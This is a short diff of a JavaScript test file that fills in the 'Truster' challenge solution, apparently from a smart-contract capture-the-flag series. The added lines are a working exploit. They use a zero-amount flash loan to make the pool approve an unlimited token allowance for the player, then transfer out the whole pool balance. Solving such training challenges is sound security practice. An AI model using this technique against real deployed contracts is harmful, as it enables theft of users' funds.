@@ -23,6 +23,11 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let data = token.interface.encodeFunctionData("approve", [player.address, ethers.constants.MaxUint256]);
+        await pool.flashLoan(0, player.address, token.address, data);
+        expect(await token.allowance(pool.address, player.address)).to.equal(ethers.constants.MaxUint256);
+        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
